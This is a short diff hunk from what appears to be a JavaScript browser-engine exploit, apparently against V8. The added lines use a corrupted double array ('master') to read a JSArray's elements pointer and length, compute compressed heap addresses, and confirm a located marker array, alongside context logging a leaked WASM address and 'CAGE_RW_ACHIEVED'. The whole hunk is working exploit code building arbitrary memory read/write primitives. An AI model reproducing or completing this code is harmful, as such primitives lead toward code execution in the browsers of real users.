@@ -107,6 +107,22 @@ try{
       log("WASM_ADDR: "+raw.toString(16));
     }
 
+    // Read JSArray [elements|length] at objOff+1
+    if(objOff>=0&&objOff+1<master.length){
+      const elemLen=f2i(master[objOff+1]);
+      const elemPtr=elemLen&0xffffffffn;
+      const arrLen=elemLen>>32n;
+      log("ELEMS: "+elemPtr.toString(16)+" LEN: "+arrLen.toString(16));
+      // elemPtr IS pinnedDoubles' real FDA compressed address!
+      // Now read pinnedDoubles[0] via master at the right offset
+      const realFdaIdx=Number((elemPtr-1n-BigInt(0x1080010)+8n)/8n);
+      log("FDA_IDX: "+realFdaIdx.toString(16));
+      if(realFdaIdx>0&&realFdaIdx<master.length){
+        const pd0=master[realFdaIdx];
+        log("PD0: "+pd0);
+        if(Math.abs(pd0-10.125)<0.001) log("PINNEDDOUBLES_FOUND");
+      }
+    }
     log("WASM_RESULT: "+wasmInst.exports.f());
     log("CAGE_RW_ACHIEVED");
   }else if(mt==="object"){
